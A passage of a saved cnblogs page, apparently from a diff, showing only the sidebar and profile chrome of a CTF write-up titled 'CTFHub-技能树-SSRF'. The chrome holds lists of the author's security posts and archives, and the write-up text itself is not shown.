+            GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
+            loadOptUnderPost();
+            GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);
+                </script>
+</div>
+
+	</div><!--end: forFlow -->
+	</div><!--end: mainContent 主体内容容器-->
+	<div id="sideBar">
+		<div id="sideBarMain">
+			<div id="sidebar_news" class="newsItem"><div class="main-header" id="main-header" style="height: 40vh; background: url(&quot;https://cdn.cnblogs.com/gh/BNDong/Cnblogs-Theme-SimpleMemory@v2.1.0/dist/images/6d995b207bae4175ff28.webp&quot;) center center / cover no-repeat rgb(34, 34, 34);"> <div id="nhBannerAnimation"> <ul class="circles"> <li></li> <li></li> <li></li> <li></li> <li></li> <li></li> <li></li> <li></li> <li></li> <li></li> </ul> </div> <div class="vertical"> <div class="main-header-content inner" style="max-width: 100vw;"> <h1 class="page-title" id="homeTopTitle" style="display: none;"><span></span></h1> <h2 class="page-description" id="hitokoto"></h2> <h3 class="page-author" id="hitokotoAuthor"></h3> <h1 class="sb-title" id="sbTitle"> <span id="sbTitleText" style="color:#fff">
+    CTFHub-技能树-SSRF
+    
+</span> <span id="sbTitleConsole" style="visibility: hidden;">_</span> </h1> <p class="article-info" id="articleInfo"><p class="article-info-text"><span class="postMeta"><i class="iconfont icon-time1"></i>20/12/11 20:54<i class="iconfont icon-browse"></i>1205<i class="iconfont icon-interactive"></i>0<i class="iconfont icon-hot"></i>1<br><i class="iconfont icon-wenzi4"></i>19059<i class="iconfont icon-shangwutubiao-"></i>38:07 ~ 63:31</span></p><a href="https://www.cnblogs.com/R3col/category/1664486.html" target="_blank"><span class="article-info-tag article-tag-class-color">CTF</span></a><a href="https://www.cnblogs.com/R3col/tag/SSRF/" target="_blank"><span class="article-info-tag article-tag-color">SSRF</span></a><a href="https://www.cnblogs.com/R3col/tag/CTFHub/" target="_blank"><span class="article-info-tag article-tag-color">CTFHub</span></a></p> </div> </div> <a class="scroll-down" href="javascript:void(0);" data-offset="-45" style="display: none;"> <span class="hidden">Scroll Down</span> <i class="scroll-down-icon iconfont icon-fanhui"></i> </a> </div><div class="container"> <div class="menu-wrap optiscroll is-enabled" id="menuWrap" style="display: none; background-image: url(&quot;https://cdn.cnblogs.com/gh/BNDong/Cnblogs-Theme-SimpleMemory@v2.1.0/dist/images/5fcc0053d3e1e4c884df.png&quot;);"><div class=" optiscroll-content" style="right: -2px; bottom: -2px;"> <div class="close-button" id="close-button"> <i class="iconfont icon-close"></i> </div> <div class="sidebar-header"> <i class="iconfont icon-guangbo"></i> &nbsp;&nbsp; <span class="sidebar-title-msg">欢迎访问本博客~</span> </div> <div class="sidebar-profile"> <div class="user-pic" id="menuBlogAvatar"><img class="img-responsive img-rounded" alt="用户头像" src="./CTFHub-技能树-SSRF - R3col - 博客园_files/20210228003438.png"></div> <div class="sidebar-userinfo" id="introduce">
+    昵称：
+    <a href="https://home.cnblogs.com/u/R3col/">
+        R3col
+    </a>
+    <br>
+    园龄：
+    <a href="https://home.cnblogs.com/u/R3col/" title="入园时间：2019-06-03">
+        4年
+    </a>
+    <br>
+    粉丝：
+    <a class="follower-count" href="https://home.cnblogs.com/u/R3col/followers/">
+        18
+    </a>
+    <br>
+    关注：
+    <a class="folowing-count" href="https://home.cnblogs.com/u/R3col/followees/">
+        11
+    </a>
+    <div id="p_b_follow" class="follow-tip">
+<a href="javascript:void(0)" onclick="follow(&#39;2f8aa281-e0eb-480b-4907-08d6e658f5b8&#39;)">+加关注</a></div>
+    
+</div> </div> <div class="sidebar-search"> <div class="sidebar-search-div"> <div class="input-group"> <span id="sb-sidebarSearchBox"><div id="sb_widget_my_zzk" class="div_my_zzk"><input id="q" type="text" autocomplete="off" placeholder="找找看..." onkeydown="return zzk_go_enter(event);" class="input_my_zzk form-control search-menu"></div></span> <div class="input-group-append"> <span class="input-group-text"> <i class="iconfont icon-sousuo2"></i> </span> </div> </div> </div> </div> <div class="customize-nav"></div> <div id="calendar-box"></div> <div class="sidebar-menu" id="customize-sidebar-menu"> <ul></ul> </div> <div class="sidebar-menu"> <ul> <li class="ng-star-inserted sidebar-dropdown"> <a href="javascript:void(0)" class="ng-star-inserted sidebar-dropdown-box"> <i class="iconfont icon-collection_fill"></i> <span class="sidebar-dropdown-title">积分排名</span> </a> <div class="sidebar-submenu" id="sb-sidebarScorerank"></div> </li> <li class="ng-star-inserted sidebar-dropdown" style="display: list-item;"> <a href="javascript:void(0)" class="ng-star-inserted sidebar-dropdown-box"> <i class="iconfont icon-time_fill"></i> <span class="sidebar-dropdown-title">最新随笔</span> </a> <div class="sidebar-submenu" id="sb-sidebarRecentposts"><ul><li><a href="https://www.cnblogs.com/R3col/p/16182823.html">DC-9</a></li><li><a href="https://www.cnblogs.com/R3col/p/16181252.html">DC-8</a></li><li><a href="https://www.cnblogs.com/R3col/p/16170402.html">DC-7</a></li><li><a href="https://www.cnblogs.com/R3col/p/16165573.html">DC-6</a></li><li><a href="https://www.cnblogs.com/R3col/p/16161122.html">DC-5</a></li><li><a href="https://www.cnblogs.com/R3col/p/16158578.html">DC-4</a></li><li><a href="https://www.cnblogs.com/R3col/p/16102871.html">DC-3</a></li><li><a href="https://www.cnblogs.com/R3col/p/16100331.html">DC-2</a></li><li><a href="https://www.cnblogs.com/R3col/p/16096196.html">DC-1</a></li><li><a href="https://www.cnblogs.com/R3col/p/16094132.html">CVE-2021-35042 Django order_by SQL注入 漏洞复现和分析</a></li></ul></div> </li> <li class="ng-star-inserted sidebar-dropdown" style="display: list-item;"> <a href="javascript:void(0)" class="ng-star-inserted sidebar-dropdown-box"> <i class="iconfont icon-label_fill"></i> <span class="sidebar-dropdown-title">我的标签</span> </a> <div class="sidebar-submenu" id="sb-toptags"><ul><li><a href="https://www.cnblogs.com/R3col/tag/XCTF/">XCTF(24)</a></li><li><a href="https://www.cnblogs.com/R3col/tag/Portswigger%20web%20security%20academy/">Portswigger web security academy(16)</a></li><li><a href="https://www.cnblogs.com/R3col/tag/PHP/">PHP(15)</a></li><li><a href="https://www.cnblogs.com/R3col/tag/SQL%E6%B3%A8%E5%85%A5/">SQL注入(13)</a></li><li><a href="https://www.cnblogs.com/R3col/tag/CTFHub/">CTFHub(12)</a></li><li><a href="https://www.cnblogs.com/R3col/tag/XSS/">XSS(6)</a></li><li><a href="https://www.cnblogs.com/R3col/tag/SSTI/">SSTI(5)</a></li><li><a href="https://www.cnblogs.com/R3col/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传(4)</a></li><li><a href="https://www.cnblogs.com/R3col/tag/Bugku/">Bugku(4)</a></li><li><a href="https://www.cnblogs.com/R3col/tag/SSRF/">SSRF(4)</a></li><li><a href="https://www.cnblogs.com/R3col/tag/">更多</a></li></ul></div> </li> <li class="ng-star-inserted sidebar-dropdown" style="display: list-item;"> <a href="javascript:void(0)" class="ng-star-inserted sidebar-dropdown-box"> <i class="iconfont icon-fenleicur"></i> <span class="sidebar-dropdown-title">随笔分类</span> </a> <div class="sidebar-submenu" id="sb-classify"><ul><li><a href="https://www.cnblogs.com/R3col/category/1664486.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">CTF(48)</a></li><li><a href="https://www.cnblogs.com/R3col/category/1664487.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">靶场(26)</a></li><li><a href="https://www.cnblogs.com/R3col/category/1664485.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">常见漏洞(3)</a></li><li><a href="https://www.cnblogs.com/R3col/category/1664482.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">常用工具(2)</a></li><li><a href="https://www.cnblogs.com/R3col/category/1664488.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">漏洞复现(1)</a></li><li><a href="https://www.cnblogs.com/R3col/category/1665560.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">其他姿势(4)</a></li><li><a href="https://www.cnblogs.com/R3col/category/1664492.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">我的安全观 &amp;&amp; 杂记(4)</a></li></ul></div> </li> <li class="ng-star-inserted sidebar-dropdown"> <a href="javascript:void(0)" class="ng-star-inserted sidebar-dropdown-box"> <i class="iconfont icon-fenlei"></i> <span class="sidebar-dropdown-title">文章分类</span> </a> <div class="sidebar-submenu" id="sb-ArticleCategory"></div> </li> <li class="ng-star-inserted sidebar-dropdown" style="display: list-item;"> <a href="javascript:void(0)" class="ng-star-inserted sidebar-dropdown-box"> <i class="iconfont icon-browse_fill"></i> <span class="sidebar-dropdown-title">阅读排行</span> </a> <div class="sidebar-submenu" id="sb-topview"><ul><li><a href="https://www.cnblogs.com/R3col/p/12452571.html">常见网络安全设备默认口令(6084)</a></li><li><a href="https://www.cnblogs.com/R3col/p/12512418.html">CTFHub-技能树-文件上传(2720)</a></li><li><a href="https://www.cnblogs.com/R3col/p/12452543.html">Sqlmap常用指令（方法）总结(2559)</a></li><li><a href="https://www.cnblogs.com/R3col/p/14741709.html">发现Webpack中泄露的api(2443)</a></li><li><a href="https://www.cnblogs.com/R3col/p/12709614.html">XCTF-easytornado(1992)</a></li></ul></div> </li> <li class="ng-star-inserted sidebar-dropdown" style="display: list-item;"> <a href="javascript:void(0)" class="ng-star-inserted sidebar-dropdown-box"> <i class="iconfont icon-like_fill"></i> <span class="sidebar-dropdown-title">推荐排行</span> </a> <div class="sidebar-submenu" id="sb-topDiggPosts"><ul><li><a href="https://www.cnblogs.com/R3col/p/14741709.html">发现Webpack中泄露的api(1)</a></li><li><a href="https://www.cnblogs.com/R3col/p/14122684.html">CTFHub-技能树-SSRF(1)</a></li><li><a href="https://www.cnblogs.com/R3col/p/12989796.html">Portswigger web security academy：Stored XSS (1)</a></li><li><a href="https://www.cnblogs.com/R3col/p/12989789.html">Portswigger web security academy：Reflected XSS (1)</a></li><li><a href="https://www.cnblogs.com/R3col/p/12617189.html">Bugku-INSERT INTO 注入(1)</a></li></ul></div> </li> <li class="ng-star-inserted sidebar-dropdown"> <a href="javascript:void(0)" class="ng-star-inserted sidebar-dropdown-box"> <i class="iconfont icon-pinglunzu"></i> <span class="sidebar-dropdown-title">最新评论</span> </a> <div class="sidebar-submenu" id="sb-recentComments"></div> </li> <li class="ng-star-inserted sidebar-dropdown" style="display: list-item;"> <a href="javascript:void(0)" class="ng-star-inserted sidebar-dropdown-box"> <i class="iconfont icon-task_fill"></i> <span class="sidebar-dropdown-title">随笔档案</span> </a> <div class="sidebar-submenu" id="sb-record"><ul><li><a href="https://www.cnblogs.com/R3col/archive/2022/04.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2022年4月(13)</a></li><li><a href="https://www.cnblogs.com/R3col/archive/2021/06.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2021年6月(1)</a></li><li><a href="https://www.cnblogs.com/R3col/archive/2021/05.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2021年5月(2)</a></li><li><a href="https://www.cnblogs.com/R3col/archive/2021/04.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2021年4月(1)</a></li><li><a href="https://www.cnblogs.com/R3col/archive/2021/03.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2021年3月(4)</a></li><li><a href="https://www.cnblogs.com/R3col/archive/2021/02.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2021年2月(5)</a></li><li><a href="https://www.cnblogs.com/R3col/archive/2020/12.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2020年12月(5)</a></li><li><a href="https://www.cnblogs.com/R3col/archive/2020/07.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2020年7月(3)</a></li><li><a href="https://www.cnblogs.com/R3col/archive/2020/06.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2020年6月(13)</a></li><li><a href="https://www.cnblogs.com/R3col/archive/2020/05.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2020年5月(3)</a></li><li><a href="https://www.cnblogs.com/R3col/archive/2020/04.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2020年4月(19)</a></li><li><a href="https://www.cnblogs.com/R3col/archive/2020/03.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2020年3月(20)</a></li></ul></div> </li> <li class="ng-star-inserted sidebar-dropdown"> <a href="javascript:void(0)" class="ng-star-inserted sidebar-dropdown-box"> <i class="iconfont icon-document_fill"></i> <span class="sidebar-dropdown-title">文章档案</span> </a> <div class="sidebar-submenu" id="sb-articlearchive"></div> </li> </ul> </div> <div class="sidebar-footer"><div class="dropdown"> <a href="https://www.cnblogs.com/R3col" target="_self"> <i class="iconfont icon-homepage_fill"></i>首页 </a> </div> <div class="dropdown"> <a href="https://msg.cnblogs.com/send/R3col" target="_blank"> <i class="iconfont icon-zhifeiji"></i>联系 </a> </div> <div class="dropdown"> <a href="javascript:void(0)" onclick="$(&quot;#blog_nav_rss&quot;).trigger(&quot;click&quot;)" data-rss="https://www.cnblogs.com/R3col/rss/"> <i class="iconfont icon-qinmifu"></i>订阅 </a> </div> <div class="dropdown"> <a href="https://i.cnblogs.com/" target="_blank"> <i class="iconfont icon-setup_fill"></i>管理 </a> </div></div> <div class="morph-shape" id="morph-shape" style="display:none" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z"> <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none"> <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"></path> <desc>Created with Snap</desc><defs></defs></svg> </div> </div><div class="optiscroll-v"><b class="optiscroll-vtrack"></b></div><div class="optiscroll-h"><b class="optiscroll-htrack"></b></div></div> <button class="menu-button menu-button-scroll" id="open-button"></button> <div class="content-wrap" id="content-wrap"></div> </div>
+    <h3 class="catListTitle">公告</h3>
+<div id="blog-news"><div id="progressBar"><div id="top-progress-bar" style="position: relative; top: 0px; left: 0px; right: 0px; background-color: rgb(119, 182, 255); height: 2px; width: 4%; transition: width 0.2s ease 0s, opacity 0.6s ease 0s; opacity: 1;"></div></div><div id="rightMenu"> <div id="rtaDirectory" class="rightMenuItem" style=""> <span class="rightMenuSpan rtaDirectorySpan"> 文章目录 </span> <i banmv="" class="iconfont icon-mulu"></i> </div> <div id="rightMenuHome" class="rightMenuItem" style="" clickflg="true"> <span class="rightMenuSpan"> 访问主页 </span> <i class="iconfont icon-home"></i> </div> <span class="hideRightMenu"> <div id="rightDiggit" class="rightMenuItem" clickflg="false" style="" onclick="votePost(14122684,&#39;Digg&#39;)"> <span class="rightMenuSpan rightDiggitSpan">1</span> <i class="iconfont icon-zan1"></i> </div> <div id="rightBuryit" class="rightMenuItem" clickflg="false" style="" onclick="votePost(14122684,&#39;Bury&#39;)"> <span class="rightMenuSpan rightBuryitSpan">0</span> <i class="iconfont icon-buzan"></i> </div> <div id="rightDashang" class="rightMenuItem" clickflg="false" style="display:none"> <span class="rightMenuSpan rightDanshanSpan"> <div class="ds-pay"> <div class="ds-alipay" style="display:none"> <img \=""> <span>Alipay</span> </div> <div class="ds-wecat" style="display:none"> <img \=""> <span>WeChat</span> </div> </div> </span> <i class="iconfont icon-dashang2"></i> </div> <div id="rightGzh" class="rightMenuItem" clickflg="false" style="display:none"> <span class="rightMenuSpan rightGzhSpan"> <div class="ds-pay"> <div class="ds-gzh"> <img><span>qrCode</span> </div> </div> </span> <i class="iconfont icon-erweima4"></i> </div> <div id="attention" class="rightMenuItem" clickflg="false" onclick="follow(&#39;2f8aa281-e0eb-480b-4907-08d6e658f5b8&#39;)"> <span class="rightMenuSpan attentionSpan">关注</span> <i class="iconfont icon-dianzan"></i> </div> </span> <div id="rightMenuSite" class="rightMenuItem" clickflg="true"> <span class="rightMenuSpan"> 点击开启 </span> <i banmv="" class="iconfont icon-shezhi3" style="transform: rotate(47deg); transform-origin: 50% 50%;"></i> </div> <div id="toUpDown" class="rightMenuItem" data="up"> <span class="rightMenuSpan toUpDownSpan">返回顶部</span> <div id="toUpDownI" style="transform: rotate(0deg); transform-origin: 50% 50%;"> <i banmv="" class="iconfont icon-zhiding"></i> </div> </div> </div><div id="loading" style="display: none;"></div>    
+    <div id="sidebar_news_content"><script type="text/javascript">window['__document_write_ajax_callbacks__']['4']();</script><script type="text/javascript">window['__document_write_ajax_callbacks__']['1']();</script>
+<script type="text/javascript">window['__document_write_ajax_callbacks__']['5']();</script><script type="text/javascript">window['__document_write_ajax_callbacks__']['6']();</script><script defer="">window['__document_write_ajax_callbacks__']['2']();</script>
+<div id="profile_block">
+    昵称：
+    <a href="https://home.cnblogs.com/u/R3col/">
+        R3col
+    </a>
+    <br>
+    园龄：
+    <a href="https://home.cnblogs.com/u/R3col/" title="入园时间：2019-06-03">
+        4年
+    </a>
+    <br>
+    粉丝：
+    <a class="follower-count" href="https://home.cnblogs.com/u/R3col/followers/">
+        18
+    </a>
+    <br>
+    关注：
+    <a class="folowing-count" href="https://home.cnblogs.com/u/R3col/followees/">
+        11
+    </a>
+    <div id="p_b_follow" class="follow-tip">
+<a href="javascript:void(0)" onclick="follow(&#39;2f8aa281-e0eb-480b-4907-08d6e658f5b8&#39;)">+加关注</a></div>
+    <script type="text/javascript">window['__document_write_ajax_callbacks__']['7']();</script><script>window['__document_write_ajax_callbacks__']['3']();</script>
+</div>
+</div>
+</div>
+<script>loadBlogNews();</script>
+
+ 
+</div>
+<div id="sidebar_c3"></div>
+			<div id="blog-calendar" style="display:none"></div><script>loadBlogDefaultCalendar();</script>			
+			<div id="leftcontentcontainer">
+				<div id="blog-sidecolumn"><!-- 搜索 -->
+<div id="sidebar_search" class="sidebar-block">
+    <div id="sidebar_search" class="mySearch">
+        <h3 class="catListTitle">搜索</h3>
+        <div id="sidebar_search_box">
+            <div id="widget_my_zzk" class="div_my_zzk">
+                <input type="text" id="q" onkeydown="return zzk_go_enter(event);" class="input_my_zzk">&nbsp;<input onclick="zzk_go()" type="button" value="找找看" id="btnZzk" class="btn_my_zzk">
+            </div>
+            
+        </div>
+    </div>
+</div>
+
+<!-- 常用链接 -->
+<div id="sidebar_shortcut" class="sidebar-block"><div class="catListLink">
+<h3 class="catListTitle">
+常用链接
+</h3>
+<ul>
+    <li><a href="https://www.cnblogs.com/R3col/p/" title="我的博客的随笔列表">我的随笔</a></li>
+<li><a href="https://www.cnblogs.com/R3col/MyComments.html" title="我的发表过的评论列表">我的评论</a></li>
+<li><a href="https://www.cnblogs.com/R3col/OtherPosts.html" title="我评论过的随笔列表">我的参与</a></li>
+<li><a href="https://www.cnblogs.com/R3col/comments" title="我的博客的评论列表">最新评论</a></li>
+<li><a href="https://www.cnblogs.com/R3col/tag/" title="我的博客的标签列表">我的标签</a></li>
+
+</ul>
+</div>
+
+</div>
+
+<!-- 最新随笔 -->
+<div id="sidebar_recentposts" class="sidebar-block"><div class="catListEssay">
+<h3 class="catListTitle">最新随笔</h3>
+    <ul>
+                <li>
+                    
+<a href="https://www.cnblogs.com/R3col/p/16182823.html">1.DC-9</a>
+
+                </li>
+                <li>
+                    
+<a href="https://www.cnblogs.com/R3col/p/16181252.html">2.DC-8</a>
+
+                </li>
+                <li>
+                    
+<a href="https://www.cnblogs.com/R3col/p/16170402.html">3.DC-7</a>
+
+                </li>
+                <li>
+                    
+<a href="https://www.cnblogs.com/R3col/p/16165573.html">4.DC-6</a>
+
+                </li>
+                <li>
+                    
+<a href="https://www.cnblogs.com/R3col/p/16161122.html">5.DC-5</a>
+
+                </li>
+                <li>
+                    
+<a href="https://www.cnblogs.com/R3col/p/16158578.html">6.DC-4</a>
+
+                </li>
+                <li>
+                    
+<a href="https://www.cnblogs.com/R3col/p/16102871.html">7.DC-3</a>
+
+                </li>
+                <li>
+                    
+<a href="https://www.cnblogs.com/R3col/p/16100331.html">8.DC-2</a>
+
+                </li>
+                <li>
+                    
+<a href="https://www.cnblogs.com/R3col/p/16096196.html">9.DC-1</a>
+
+                </li>
+                <li>
+                    
+<a href="https://www.cnblogs.com/R3col/p/16094132.html">10.CVE-2021-35042 Django order_by SQL注入 漏洞复现和分析</a>
+
+                </li>
+    </ul>
+</div>
+
+</div>
+
+<!-- 我的标签 -->
+<div id="sidebar_toptags" class="sidebar-block"><div class="catListTag">
+    <h3 class="catListTitle"><a href="https://www.cnblogs.com/R3col/tag/" class="sidebar-card-title-a">我的标签</a></h3>
+<ul>
+        <li>
+            <a href="https://www.cnblogs.com/R3col/tag/XCTF/">XCTF<span class="tag-count">(24)</span></a>
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/R3col/tag/Portswigger%20web%20security%20academy/">Portswigger web security academy<span class="tag-count">(16)</span></a>
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/R3col/tag/PHP/">PHP<span class="tag-count">(15)</span></a>
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/R3col/tag/SQL%E6%B3%A8%E5%85%A5/">SQL注入<span class="tag-count">(13)</span></a>
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/R3col/tag/CTFHub/">CTFHub<span class="tag-count">(12)</span></a>
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/R3col/tag/XSS/">XSS<span class="tag-count">(6)</span></a>
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/R3col/tag/SSTI/">SSTI<span class="tag-count">(5)</span></a>
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/R3col/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传<span class="tag-count">(4)</span></a>
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/R3col/tag/Bugku/">Bugku<span class="tag-count">(4)</span></a>
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/R3col/tag/SSRF/">SSRF<span class="tag-count">(4)</span></a>
+        </li>
+    <li>
+        <a href="https://www.cnblogs.com/R3col/tag/">更多</a>
+    </li>
+
+</ul>
+</div>
+
+</div>
+
+<!-- 积分与排名 -->
+
+
+<!-- 随笔分类、随笔档案、文章分类、新闻分类、相册、链接 -->
+<div id="sidebar_categories">
+
+    <div id="sidebar_postcategory" class="catListPostCategory sidebar-block">
+        <h3 class="catListTitle">
+            
+    <a class="sidebar-card-title-a" href="https://www.cnblogs.com/R3col/post-categories">随笔分类</a>
+<span class="sidebar-category-item-count">
+    (88)
+</span>
+
+
+        </h3>
+
+        <ul>
+
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/category/1664486.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">CTF(48)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/category/1664487.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">靶场(26)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/category/1664485.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">常见漏洞(3)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/category/1664482.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">常用工具(2)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/category/1664488.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">漏洞复现(1)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/category/1665560.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">其他姿势(4)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/category/1664492.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">我的安全观 &amp;&amp; 杂记(4)</a>
+ 
+                </li>                
+            
+        </ul>
+
+
+    </div>    
+    <div id="sidebar_postarchive" class="catListPostArchive sidebar-block">
+        <h3 class="catListTitle">
+            
+随笔档案<span class="sidebar-category-item-count">
+    (89)
+</span>
+
+
+        </h3>
+
+        <ul>
+
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/archive/2022/04.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2022年4月(13)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/archive/2021/06.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2021年6月(1)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/archive/2021/05.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2021年5月(2)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/archive/2021/04.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2021年4月(1)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/archive/2021/03.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2021年3月(4)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/archive/2021/02.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2021年2月(5)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/archive/2020/12.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2020年12月(5)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/archive/2020/07.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2020年7月(3)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/archive/2020/06.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2020年6月(13)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/archive/2020/05.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2020年5月(3)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/archive/2020/04.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2020年4月(19)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/R3col/archive/2020/03.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">2020年3月(20)</a>
+ 
+                </li>                
+            
+        </ul>
+
+
+    </div>    
+</div>
+
+<!-- 最新评论 -->
+
+
+
+<!-- 阅读排行榜 -->
+<div id="sidebar_topviewedposts" class="sidebar-block"><div class="catListView">
+    <h3 class="catListTitle">
+        <a href="https://www.cnblogs.com/R3col/most-viewed" class="sidebar-card-title-a">
+    阅读排行榜
+</a>
+
+    </h3>
+    <div id="TopViewPostsBlock">
+        <ul style="word-break:break-all">
+                    <li>
+                        <a href="https://www.cnblogs.com/R3col/p/12452571.html">
+                            1. 常见网络安全设备默认口令(6084)
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://www.cnblogs.com/R3col/p/12512418.html">
+                            2. CTFHub-技能树-文件上传(2720)
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://www.cnblogs.com/R3col/p/12452543.html">
+                            3. Sqlmap常用指令（方法）总结(2559)
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://www.cnblogs.com/R3col/p/14741709.html">
+                            4. 发现Webpack中泄露的api(2443)
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://www.cnblogs.com/R3col/p/12709614.html">
+                            5. XCTF-easytornado(1992)
+                        </a>
+                    </li>
+        </ul>
+    </div>
+</div></div>
+
+<!-- 评论排行榜 -->
+
+
+<!-- 推荐排行榜 -->
+<div id="sidebar_topdiggedposts" class="sidebar-block">
+<div id="topdigg_posts_wrap">
+    <div class="catListView">
+        <h3 class="catListTitle">
+            <a href="https://www.cnblogs.com/R3col/most-liked" class="sidebar-card-title-a">推荐排行榜</a>
+
+        </h3>
+        <div id="TopDiggPostsBlock">
+            <ul style="word-break: break-all">
+                        <li>
